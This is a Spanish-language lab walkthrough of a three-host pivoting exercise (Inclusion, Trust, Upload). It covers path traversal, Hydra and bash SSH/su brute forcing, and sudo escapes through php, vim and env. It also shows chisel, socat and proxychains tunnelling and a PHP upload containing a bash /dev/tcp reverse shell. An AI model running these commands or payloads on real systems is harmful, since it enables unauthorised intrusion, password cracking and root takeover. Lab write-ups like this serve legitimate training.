

>[!NOTE] Habilidades:
> Path Traversal, SSH Brute Force, Pivoting with Chisel, Socat (Lateral Movement), Proxychains Usage, PHP Sudo Privilege Escalation ,Vim Sudo Privilege Escalation, File Upload, Env Sudo Privilege Escalation

# Reconocimiento 10.10.10.2 (Inclusion)
---
## Nmap 
Empezamos lanzando un escaneo de puertos abiertos por `TCP` con `nmap`

~~~ bash
# Escaneo de descubrimiento de puertos 
nmap --open -p- --min-rate 5000 -n -sS -v -Pn 10.10.10.2 -oG allPorts_10.10.10.2
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000* paquetes por segundo*
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grep`
- `-v`: Mostrar la información en tiempo real

Nmap nos muestra los siguientes puertos abiertos

![[Pasted image 20241007220209.png]]

Ahora realizamos un segundo escaneo con el propósito de identificar el servicio y versión que se ejecuta en los puertos que encontramos

~~~ bash
# Escaneo de servicios y versiones
nmap -sVC -p 22,80 10.10.10.2 -oN targeted_10.10.10.2
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: uso de scripts de reconocimiento para identificar posibles vulnerabilidades conocidas
- `-oN`: Exportar en formato `nmap` (se vea igual que el output de nmap)

![[Pasted image 20241007220441.png]]
### Whatweb

Como está el puerto `80` abierto, podemos echar un vistazo a la página web con la ayuda de un navegador, o bien lanzar `curl`, además utilizaremos la herramienta `whatweb` para listar las tecnologías descubiertas en el servidor

~~~ bash
whatweb http://10.10.10.2
~~~

![[index.png]]

## Gobuster 

Haremos `fuzzing` para descubrir directorios en el servidor web, para esto usaremos la herramienta `gobuster` utilizando un diccionario

~~~ bash
gobuster dir http://10.10.10.2 -w /usr/share/seclists/Discovrey/Web-Content/directory-list-2.3-medium.txt
~~~

![[gobuster_1.png]]

Encontramos el directorio `shop`, y al visitar la página, vemos lo siguiente

![[shop index.png]]

# Explotación 10.10.10.2 (Inclusion)
---
## Path Traversal

A simple vista vemos un supuesto error al intentar cargar la variable `archivo` con el método `$_GET` de `php`. Usaremos esta variable para intentar explotar Path Traversal, así que primero probamos leer archivos del sistema, una detección básica es la siguiente que lee el fichero `/etc/passwd`

~~~ bash
curl -sL http://10.10.10.2/shop\?archivo\=../../../../etc/passwd
~~~

- `-s`: No mostrar el output
- `-L`: Seguir el redireccionamiento del servidor

**Nota** que debemos escapar los caracteres **?** y **=** porque nos da problemas con nuestra terminal, o puedes también poner la solicitud **"entre comillas"**.

![[LFI_detection.png]]

Logramos ver los usuarios `manchi` y `seller` en la respuesta del servidor

![[LFI_etc_passwd.png]]

Podemos almacenar los usuarios existentes en un archivo `users.txt` de forma rápida con el siguiente comando

~~~ bash
curl -sL http://10.10.10.2/shop\?archivo\=../../../../etc/passwd | grep "/bin/bash" | grep -v "pre" | awk -F ':' '{print $1}' > users.txt
~~~

La salida de este comando nos debería reportar los usuarios de la siguiente forma

~~~ bash
manchi
seller
~~~

## SSH Brute Force

Podemos usar el archivo `users.txt` que creamos anteriormente para forzar `ssh` con la herramienta `hydra`, para esto usaremos el diccionario `rockyou.txt`

~~~ bash
hydra ssh://10.10.10.2 -L users.txt -P /usr/share/wordlists/rockyou.txt
~~~

![[ssh_brute_force_1.png]]

Y encontramos la contraseña para el usuario `manchi`, así que nos conectamos por `ssh` a la máquina `10.10.10.2` con la contraseña `lovely`

~~~ bash
ssh manchi@10.10.10.2
~~~


# Escalada de privilegios 10.10.10.2 (Inclusion)
---

Lo primero que haremos será cambiar el valor de la variable `TERM`, y le asignamos el valor `xterm`, esto para poder hacer `Ctrl + L` para limpiar la pantalla igual que en nuestra `zsh`

![[Pasted image 20241007220843.png]]

Si buscamos privilegios SUID, Sudo, Capabilities, LinPEAS, no encontraremos información significativa que nos permita elevar nuestros privilegios.

## SSH Brute Force (Bash)

Recordemos que existe un usuario `seller` en esta máquina, podríamos intentar hacer fuerza bruta para encontrar su contraseña, haremos un script de `bash` que nos permita hacer esto, y para probar las contraseñas, usaremos el `rockyou.txt`.

Para usar el  `rockyou.txt` podemos compartirlo desde nuestra máquina atacante a la máquina Inclusion

~~~ bash
python3 -m http.server 80
~~~

![[Pasted image 20241016155441.png]]

![[Pasted image 20241016155420.png]]

Ahora creamos el archivo `brutesu.sh` (o cualquier otro nombre) y le asignamos permisos de ejecución con el comando `chmod +x brutesu.sh`, la forma en la que probamos cada contraseña está dentro de la función `brute`

~~~ bash
user=$1 # seller
dict=$2 # rockyou.txt

while IFS= read -r password; do echo "user: $user, pass:$password"; echo "$password" | su -c '' "$user" 2>/dev/null
done < $dict
~~~

- `user=$1`: Asignamos el primer argumento que enviamos cuando ejecutamos el script a la variable `user`
- `dict=$2`: Asignamos el valor del segundo argumento a la variable `dict`
- `while IFS= read -r password`: Lee línea por línea un archivo, en este caso la línea la llamamos `password`
- `echo "seller, pass:$password" `: Mostramos la contraseña que se está usando para ejecutar el comando como el usuario `seller`
- `echo "$password" | su -c 'whoami' "$user" 2>/dev/null` Intentamos autenticar al usuario con la variable `password` que estamos iterando en cada línea del `rockyou.txt`, si esto es exitoso, ejecutamos el comando `whoami`
- `if [ $? -eq 0 ]`: Evaluamos la salida del comando anterior, si es `0`, mostramos la contraseña correcta

![[Pasted image 20241016170504.png]]

Ejecutaríamos el script de la siguiente forma

~~~ bash
bash /brutesu.sh seller rockyou.txt # Suponiendo que tenemos el rockyou.txt en la misma carpeta
~~~

![[Pasted image 20241016170346.png]]

El script encontró una contraseña para el usuario `seller`, que es este caso es `qwerty`

~~~ bash
echo 'qwerty' | su -c '' 'seller' 2>/dev/null && echo 'Login success'
~~~

Si ejecutamos este comando ocurre lo siguiente

- Aplicamos el comando `su` a la contraseña que imprimimos anteriormente
- El comando resulta exitoso, por lo que el código que nos retorna es `0`, esto quiere decir que el comando se ejecutó sin errores. Podemos ver este código si ejecutamos `echo $?` justo después de ejecutar el comando anterior
- Usamos el operador `&&` para decirle a `bash` que ejecute el comando que ingresaremos después del operador **sólo si el código fue 0 en el comando anterior**


![[Pasted image 20241016170925.png]]
Ahora como ya tenemos la contraseña, podemos migrar al usuario `seller` para continuar con nuestra escalada

![[Pasted image 20241016171834.png]]

Veamos los permisos `sudo`que tiene este usuario

![[Pasted image 20241016171931.png]]
Pudiendo ejecutar `php`, podemos ejecutar comandos como `root`, así que en mi caso, ejecutaré una consola como `root` con el siguiente comando

~~~ bash
sudo php -r 'system("/bin/bash");'
~~~

`-r`: Ejecutar el código proporcionado desde la terminal.
`system("/bin/bash")`: Ejecuta un comando en el sistema operativo, en este caso, hace una llamado a `bash`.

![[Pasted image 20241016172743.png]]

## Reconocimiento otras redes

El objetivo de este laboratorio es pivotar, así que comencemos desde la máquina `10.10.10.2` a hacer un reconocimiento a través de este host para **identificar otras redes a las que tengamos alcance**, hay varias formas, dos de aquellas serían ver el archivo `/etc/hosts` o **direcciones ip que tengamos asignadas en las interfaces de red** con el comando `hostname`

~~~ bash
cat /etc/hosts

hostname -I
~~~

![[Pasted image 20241007220936.png]]

![[Pasted image 20241007220954.png]]

## Bash Host Scanner
Vemos que tenemos asignada una dirección IP `20.20.20.2`, por lo que ahora haremos un escaneo de esta subred para descubrir nuevos hosts

~~~ bash
for i in $(seq 1 254); do ping -c1 20.20.20.$i & done | grep from
~~~

![[Pasted image 20241007233157.png]]

Podemos ver que nos responde la dirección ip `20.20.20.3`

# Pivoting a 20.20.20.3 (Trust)
---
## Chisel

En este punto tenemos comunicación con el host `20.20.20.3` desde la `10.10.10.2` a través de la interfaz con la IP `20.20.20.2`, por lo que para poder alcanzar esa red con nuestra máquina atacante podemos usar `chisel` para establecer un túnel

Podemos copiar el binario de `chisel` en nuestra máquina y compartirlo en nuestra red, de forma que lo descargaremos en `10.10.10.2`

~~~ bash
cp $(which chisel) .
~~~

Ahora con `python3` compartimos el binario en el directorio actual

~~~ bash
python3 -m http.server 8000
~~~

![[Pasted image 20241007233503.png]]

Nos descargamos `chisel` desde la máquina `10.10.10.2`

~~~ bash
wget http://10.10.10.1:8000/chisel
~~~

![[chisel_1_wget.png]]

![[python_server_chisel.png]]

Una vez descargamos `chisel` en `10.10.10.2`, para poder usar esta herramienta primeramente le damos permisos de ejecución

~~~ bash
chmod +x chisel
~~~ 

![[Pasted image 20241007233630.png]]

### Servidor

Antes de usarla debemos estar en escucha con nuestra máquina atacante por algún puerto con `chisel`, en mi caso, usaremos el puerto **8000**

![[chisel_server_setup.png]]

### Cliente

Y ahora nos conectamos desde `10.10.10.2` a nuestro servidor por el puerto `8000`

~~~ bash
./chisel client 10.10.10.1:8000 R:socks
~~~

- `R:socks`: Definir un túnel inverso, en este caso usando el protocolo SOCKS, todas las conexiones desde el servidor llegarán a este cliente, permitiendo que podamos acceder a los recursos de esta máquina

![[chisel_client_10.10.10.2_connect.png]]

Hemos establecido el proxy, deberíamos ver que se abre un puerto en nuestra máquina atacante, en mi caso es el `1080`

![[chisel_server_open_session.png]]

### Configuración Proxychains

Ahora debemos editar el archivo `/etc/proxychains.conf` para hacer uso del proxy `socks` que acabamos de establecer. Para ello, agregamos la siguiente línea al final del archivo en la `ProxyList`

~~~ php
socks5 127.0.0.1 1080
~~~

![[Pasted image 20241008000242.png]]

![[Pasted image 20241008000306.png]]

También activamos la opción `dynamic_chain`

![[proxychains_dynamic_chain.png]]

### Flujo del tráfico hacia la máquina Trust

Expliquemos lo que acabamos de hacer de una forma más gráfica.

![[Pasted image 20240928233156.png]]

- Iniciamos `chisel` en modo servidor por el puerto `8000` en nuestra máquina atacante
- **Inclusion** se conecta a nuestro servidor con `chisel` en modo cliente
- Se establece un túnel utilizando el protocolo SOCKS5 en nuestra máquina en el puerto `1080`
- Configuramos `proxychains` para que envíe tráfico a través de este puerto, que hace referencia al puerto `1080` de **Inclusion**

Ahora podemos redirigir el tráfico por el proxy **SOCKS5** abierto en nuestra máquina por el puerto `1080` usando `proxychains`. De esta forma alcanzaríamos la máquina **Trust** pasando por la máquina **Inclusion**


# Reconocimiento 20.20.20.3 (Trust)

## Nmap a través de ProxyChains

Ahora podemos realizar un escaneo de puertos a la máquina `20.20.20.3` con `nmap` usando `proxychains`, el escaneo se realizaría a través del túnel **SOCKS5** abierto en nuestro puerto `1080`, pero cuidado, ahora no podemos usar el escaneo SYN Sealth Scan como lo hicimos con la máquina `Trust`, ahora debemos usar el parámetro `-sT`

~~~ bash
proxychains -q nmap -Pn -sT -n --min-rate 5000 --open 20.20.20.3 -v -oG allports_20.20.20.3
~~~

- `-sT`: TCP Connect Scan, completa la conexión con el puerto de la máquina víctima que se está escaneando, este modo de escaneo envía el paquete `RST` que concluye la conexión entre el puerto y nuestra máquina
- `proxychains -q`: Modo `quiet`, no muestra el output de `proxychains`

![[Pasted image 20241016114222.png]]

Haremos un escaneo para detectar la versión de los servicios que ejecuta esta máquina

~~~ bash
proxychains -q nmap -p 22,80 -sT 20.20.20.3 -oN targeted_20.20.20.3 
~~~

![[Pasted image 20241016115040.png]]

## Servicio web

Como el puerto 80 está abierto, enviaré una solicitud a través de nuestro proxy a modo de prueba con el comando `curl`

~~~ bash
curl --proxy socks5://localhost:1080 
~~~

Para usar el proxy en este caso lo especificamos con el parámetro `--proxy`, y debemos indicar el protocolo `socks5`, además del puerto `1080` que es el que abrió `chisel`

![[Pasted image 20241007235709.png]]

Configuraremos nuestro `FoxyProxy` para que use nuestro túnel para conectarse a la `20.20.20.2` para poder ver de forma visual el contenido del servicio `http`

![[Pasted image 20241008000510.png]]

Con el proxy activado ahora deberíamos poder ver el contenido de la web

![[Pasted image 20241008000607.png]]

![[Pasted image 20241008000644.png]]

## Fuzzing 20.20.20.3

Repetiremos un poco el proceso de `fuzzing` para encontrar directorios que no conocemos (aún), pero ahora podemos usar la opción `-proxy` de `gobuster`

~~~ bash
gobuster dir -u http://20.20.20.3 -w /usr/share/Seclist.... -x php,html,txt -t 200 --proxy socks5://127.0.0.1:1080
~~~

![[Pasted image 20241016114608.png]]

Vemos que existe un archivo `secret.php`, por lo que le echaremos un vistazo en el navegador

![[Pasted image 20241016114717.png]]

Podemos pensar a primera vista que el usuario `mario` existe en la máquina Trust (`20.20.20.3`), por lo que podemos 


# Explotación 20.20.20.3 (Trust)
## SSH Brute Force (Proxychains)

Una forma más sencilla sería usar el proxy que tenemos en nuestra máquina que nos conecta con `20.20.20.3` con `proxychains`, y así hacer fuerza bruta con `hydra` para intentar encontrar la contraseña del usuario `mario`

~~~ bash
prxychains -q hydra -l mario -P /usr/share/seclists/rockyou.txt ssh://20.20.20.3 
~~~

![[Pasted image 20241016151521.png]]
y la contraseña que nos encuentra es `chocolate` para el usuario `mario`

## Salto a la 20.20.20.3 (Proxychains)

Somos capaces de llegar a la máquina Trust a través de `proxychains`, pero también podemos modificar la conexión para que 
![[Pasted image 20241016173559.png]]

Como tenemos la contraseña del usuario `mario`, la usaremos para conectarnos a `20.20.20.3` a través del túnel `socks`

~~~ bash
proxychains ssh mario@20.20.20.3
~~~

![[pivot to 20_20_20_3.png]]

## Salto a la 20.20.20.3 (Socat)

Podemos usar la herramienta `socat` para reenviar el tráfico desde `10.10.10.2` hasta la máquina `20.20.20.3`

Primero nos descargamos el binario compilado de `socat`, luego lo compartimos con python

![[Pasted image 20241016223020.png]]

![[Pasted image 20241016223006.png]]

Le damos permisos de ejecución con el comando

~~~ bash
chmod +x socat
~~~

Ahora podemos usar el siguiente comando para hacer que nuestro puerto `443` reenvíe las conexiones entrantes a el puerto `22` de la máquina `20.20.20.3`

~~~ bash
./socat TCP-LISTEN:443,fork TCP:20.20.20.3:22
~~~

- `TCP-LISTEN`: Escucha por el puerto `443`
- `fork`: Acepta varias conexiones TCP
- `TCP`: Envía los datos recibidos a `20.20.20.3` al puerto `22` remoto
En este momento desde nuestra máquina atacante podemos llegar al puerto `22` de la máquina `20.20.20.3` pasando primero por `10.10.10.2`

~~~ bash
ssh mario@10.10.10.2 -p 443
~~~

- `-p`: Puerto de la máquina remota que usaremos en la conexión 

![[Pasted image 20241016223356.png]]



# Escalada de privilegios 20.20.20.3 (Trust)
---
## (Posible) Escalada de privilegios

Una vez dentro de la máquina, buscaremos archivos con privilegios `suid`, buscaremos también `capabilities`, pero no obtenemos gran cosa. Otra cosa que haremos será listar los privilegios `sudo`, y encontramos lo siguiente

~~~ bash
# Buscar archivos con privilegios SIUD
find / -perm /4000 2>/dev/null

# Listar capabilities
getcap -r 2>/dev/null

# Listar privilegios sudo
sudo -l 
~~~

![[sudoers.png]]

## Sudo Vim

Tenemos privilegios para ejecutar `vim` como el usuario `root`, podemos ejecutarnos una `bash` con el siguiente comando

~~~ bash
sudo vim -c '!/bin/bash'
~~~

![[Pasted image 20241016223910.png]]

Vemos otra IP perteneciente a la red `30.30.30.2` en nuestra máquina, por lo que haremos un escaneo de la red para ver si se encuentra algún host activo

~~~ bash
hostname -I
~~~

![[Pasted image 20241016223944.png]]


# Pivoting a 30.30.30.3 (Upload)
----
## Socat

Para llegar a tener comunicación con `30.30.30.3`, podríamos reenviar esto a nuestra máquina atacante con `socat`, por lo descargaremos en `20.20.20.2` con `wget`, para ello podemos descargar el binario desde `github` en nuestra máquina y lo compartiremos por nuestra red local con `python3`

![[Pasted image 20241016224423.png]]

Desde la máquina `20.20.20.2` nos ponemos en escucha en el puerto `1111` y reenviamos la conexión a nuestra máquina atacante por el puerto `9000`

~~~ bash
./socat TCP-LISTEN:1111,fork TCP:10.10.10.1:8000
~~~

![[socat 20.20.20.2 puerto 1111.jpg]]
- `fork`: Indicamos que `socat` puede recibir más de una conexión por ese puerto

Ahora necesitamos `chisel` en nuestra máquina `20.20.20.3` para poder hacer un escaneo de puertos, por lo que nos descargamos  `chisel` en esta máquina con `wget` 


![[chisel_wget.png]]

No olvidemos dar permisos de ejecución

~~~ bash
chmod +x chisel socat
~~~

Ahora podemos conectarnos a `20.20.20.2:1111` y a través de este puerto estaremos llegando a nuestra máquina atacante

~~~ bash
./chisel client 20.20.20.2:1111 R:socks 
~~~

![[tunel_desde_20.20.20.3_a_atacante 1.png]]

Deberíamos ver una nueva sesión en nuestro servidor `chisel`

![[Pasted image 20241016230653.png]]

### Flujo del tráfico hacia la máquina Upload

Expliquemos un poco el funcionamiento de este nuevo túnel SOCKS5 a través del siguiente diagrama

![[diagram.jpg]]

- `30.30.30.2` se conecta con `chisel` a `20.20.20.2:1111`, que está en escucha con `socat`
- `20.20.20.2` reenvía la solicitud a través de `socat` a `10.10.10.1:8000`, que está en escucha como servidor
- `10.10.10.1` que es nuestra máquina atacante, inicia una sesión usando el puerto `1111` por el cual establece el túnel SOCKS5
- Hacemos uso de `proxychains` para enviar información a través del túnel por el puerto `1111`

De esta forma ahora tendríamos comunicación a la máquina **Upload**, primero pasando a través de **Inclusion**, y luego a través de **Trust**.



# Reconocimiento a la 30.30.30.3 (Upload)
---
## Nmap scan a través de ProxyChains

~~~ bash
proxychains nmap -sT -Pn -n --min-rate 5000 30.30.30.3 -oG allports_30.30.30.3 -v 
~~~

Para poder hacer el escaneo necesitamos usar el parámetro `-sT` (TCP Connect) y el parámetro `-Pn` (Desactivar el descubrimiento de host). De esta forma estaremos realizando un escaneo de puertos a través del túnel SOCKS que abrimos con `chisel`

![[Pasted image 20241016231959.png]]

Haremos un segundo escaneo de los puertos abiertos para detectar la versión del servicio que se ejecuta

~~~ bash
proxychains nmap -sT -Pn -sCV 22,80 30.30.30.3 -v -oN services_30.30.30.3
~~~

![[Pasted image 20241016232115.png]]

## Servicio Web

Veamos que hay en la página, podemos usar `foxy proxy` para alcanzar la máquina `30.30.30.3` a través del mismo proxy que teníamos creado anteriormente

![[Pasted image 20241016232345.png]]

![[Pasted image 20241016232257.png]]

Subiré un archivo `hola.txt` como prueba

![[Pasted image 20241016232514.png]]


## Fuzzing 30.30.30.3

Veamos si descubirmos alguna ruta o archivo en `30.30.30.3`

~~~ bash
gobuster dir -u http://30.30.30.3 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,xml,txt --proxy socks5://localhost:1080
~~~

![[Pasted image 20241016232708.png]]

Vemos que existe una ruta `uploads`, supongo que ahí estará mi archivo `hola`

![[Pasted image 20241016232946.png]]

En este punto podemos intentar subir un archivo con código que se pueda interpretar, en este caso, como es un servidor `Apache`, podríamos subir un archivo `php` y ver si el servidor lo interpreta.


# Explotación 30.30.30.3 (Upload)
---
## File Upload

Vamos a crear un archivo `revshell.php`, en este caso, este archivo envía una `reverse shell` a la máquina `30.30.30.2` al puerto `441` que es la máquina Trust, pero haremos que esa reverse shell llegue hasta nuestra máquina de atacante con la ayuda de `socat`

~~~ php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/30.30.30.2/441 0>&1'")?>
~~~

![[Pasted image 20241016233404.png]]

En mi caso voy a copiarlo al escritorio porque en un directorio del usuario `root` 

![[Pasted image 20241016233928.png]]

![[Pasted image 20241016234022.png]]

![[Pasted image 20241016234107.png]]

Una vez subimos el archivo, podemos abrirlo desde el directorio `uploads`. Pero antes configuramos las conexiones con `socat`

- `30.30.30.2:441` -> `20.20.20.2:442`
- `20.20.20.2:442` -> `10.10.10.1:443`


### Reconfigurar el túnel SOCKS

Podemos limpiar los procesos de `socat` anteriores con el siguiente comando si es que da error al intentar iniciar `socat` en un puerto que usaste antes

~~~ bash
killall socat &
~~~

![[Pasted image 20241016234359.png]]

#### 30.30.30.2

Para no perder la conexión y no volver a iniciar otra terminal hasta llegar al mismo punto en el que estamos, podemos volver a iniciar el túnel pero en segundo plano con `&`

~~~ bash
./chisel client 20.20.20.2:1111 R:socks &
~~~

Si falla el comando anterior y necesitas volver a aplicarlo, puedes limpiar el proceso de `chisel` igual que con `socat` con el siguiente comando

~~~ bash
killall chisel &
~~~

![[Pasted image 20241016235938.png]]
#### 20.20.20.2

Repetimos el comando que ejecutaba `socat` pero agregamos el `&` al final

~~~ bash
./socat TCP-LISTEN:1111,fork TCP:10.10.10.1:8000 &
~~~

![[Pasted image 20241016235201.png]]

## Reverse Shell

Empezamos en la máquina `30.30.30.2`, reenviamos la reverse shell que nos envía la máquina Upload por el puerto `441` a la máquina Trust al puerto `442`

~~~ bash
./socat TCP-LISTEN:441,fork TCP:20.20.20.2:442
~~~
![[Pasted image 20241016234606.png]]


Ahora configuramos la máquina Trust para que reenvíe hacia nuestro puerto `443`

~~~ bash
./socat TCP-LISTEN:442,fork TCP:10.10.10.1:443
~~~

![[Pasted image 20241016234929.png]]

Posteriormente ponemos en escucha el puerto `443` de nuestra máquina


~~~ bash
nc -lvnp 443
~~~
![[Pasted image 20241016234919.png]]

Finalmente ejecutamos el archivo desde el navegador

![[Pasted image 20241017000131.png]]

Estamos dentro...

### Explicación gráfica

Veamos cómo viaja la `shell` que enviamos desde Upload hasta nuestra máquina atacante

![[revere shell.jpg]]

- **Upload** ejecuta el archivo `php` malicioso que contiene la `reverse shell`, se envía una consola a **Trust**
- **Trust** recibe la `shell` por el puerto `:441` y reenvía la shell a **Inclusion**
- **Inclusion** recibe la conexión por el puerto `:442`, reenvía con `socat` la `shell` a nuestra máquina atacante
- Nuestra máquina que está a la escucha con `netcat`  recibe la conexión por el puerto `:443`


# Escalada de privilegios 30.30.30.3 (Upload)

## TTY Treatment

Hacemos un tratamiento de la TTY para poder tener una consola interactiva

~~~ bash
script /dev/null -c bash
export TERM=xterm
export SHELL=bash
~~~

![[Pasted image 20241017000325.png]]

Ahora hacemos CTRL + Z y ejecutamos lo siguiente

~~~ bash
stty raw -echo; fg
~~~
Volvemos al proceso de la reverse shell, entonces ejecutamos

~~~ bash
reset xterm
~~~

Ahora tenemos una consola más cómoda, pero deberíamos tener las proporciones de nuestra terminal

![[Pasted image 20241017000738.png]]

~~~ bash
stty rows 46 columns 183
~~~

![[Pasted image 20241017000842.png]]

## Sudo env

Si vemos los privilegios `sudo`, vemos que podemos ejecutar el comando `env` sin proporcionar contraseña

![[Pasted image 20241017001830.png]]

### Root Time

Podemos lanzarnos una `bash` con el siguiente comando

~~~ bash
sudo env /bin/bash
~~~

![[Pasted image 20241017001952.png]]